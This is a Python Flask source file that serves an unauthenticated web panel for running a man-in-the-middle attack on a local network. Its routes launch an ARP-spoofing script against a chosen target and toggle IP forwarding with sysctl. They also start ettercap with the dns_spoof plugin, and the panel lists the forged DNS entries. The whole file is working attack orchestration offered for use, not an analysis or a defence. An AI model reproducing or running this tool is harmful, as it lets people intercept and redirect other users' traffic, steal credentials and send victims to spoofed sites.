#!/usr/bin/env python
from flask import *
import subprocess
import os

app = Flask(__name__)
arp_pro = None
atk_pro = None
f_output = None
f_error = None
f = None
error_status = 0
is_atk = None
to_ip = ''
lie_ip = ''
# app.register_blueprint(contact)


@app.route('/start_arp', methods=['GET'])
def start_arp():
    global arp_pro
    global f_output
    global f_error
    global error_status
    global to_ip
    global lie_ip
    to_ip = request.args.get("to_ip")
    lie_ip = request.args.get("lie_ip")
    c = ['arp.py', to_ip, lie_ip]
    if arp_pro is None:
        f_output = open(app.root_path + "/output.txt", 'w+')
        f_error = open(app.root_path + "/error.txt", 'w+')
        arp_pro = subprocess.Popen(c, stdout=f_output, stderr=f_error)
        msg = 'Start'
    else:
        f_error.flush()
        b = open(app.root_path + "/error.txt", 'r')
        file_length = len(str(b.readlines()))
        if file_length > 100:
            msg = 'error'
            error_status = 1
        else:
            msg = 'Program is running'
    return msg


@app.route("/stop_arp", methods=['GET'])
def stop_arp():
    global arp_pro
    global f_output
    global f_error
    global error_status
    global to_ip
    global lie_ip
    if arp_pro is not None:
        arp_pro.kill()
        if f_output is not None:
            f_output.close()
            f_output = None
        if f_error is not None:
            f_error.close()
            f_error = None
        arp_pro = None
        error_status = 0
        to_ip = ''
        lie_ip = ''
        msg = 'Stop'
    else:
        msg = 'No program run'
    return msg


@app.route("/start_atk", methods=['GET'])
def start_atk():
    global is_atk
    global atk_pro
    global to_ip
    global f
    if atk_pro is None:
        f = open(os.devnull, 'w')
        cmd = ['ettercap', '-i', 'ens33', '-T', '-P', 'dns_spoof', '/%s///' % to_ip]
        atk_pro = subprocess.Popen(cmd, stdout=f)
        is_atk = True
        msg = 'start atk'
    else:
        msg = 'atk runing'
    return msg

@app.route("/stop_atk", methods=['GET'])
def stop_atk():
    global is_atk
    global atk_pro
    global f
    if atk_pro is not None:
        atk_pro.kill()
        f.close()
        del(atk_pro)
        atk_pro = None
        is_atk = None
        msg = 'stop atk'
    else:
        msg = 'no atk'
    return msg


@app.route('/open_forward', methods=['GET'])
def open_f():
    os.system('sysctl -w net.ipv4.ip_forward=1')
    return 'Success'


@app.route('/close_forward', methods=['GET'])
def close_f():
    os.system('sysctl -w net.ipv4.ip_forward=0')
    return 'Success'


@app.route("/", methods=['GET'])
def index():
    return render_template("main.html")


@app.route("/main/console", methods=['GET'])
def console():
    global arp_pro
    global error_status
    global f_error
    global to_ip
    global lie_ip
    global is_atk
    if arp_pro is None:
        status = 0
    else:
        if error_status is 1:
            status = 2
        else:
            f_error.flush()
            b = open(app.root_path + "/error.txt", "r")
            error_length = len(str(b.readlines()))
            if error_length > 100:
                status = 2
                error_status = 1
            else:
                status = 1
    with open("/etc/ettercap/etter.dns") as FILE:
        data = FILE.readlines()

    d = []
    for line in data:
        src = line.split(" ")
        dns = src[0]
        dns_level = src[1]
        ip = src[2].strip()
        d.append({"dns": dns, "dns_level": dns_level, "ip": ip})

    return render_template("console.html", data=d, status=status, to_ip=to_ip, lie_ip=lie_ip, is_atk=is_atk)


if __name__ == '__main__':
    #app.debug = True
    app.run(host='0.0.0.0', port=55556, threaded=True)
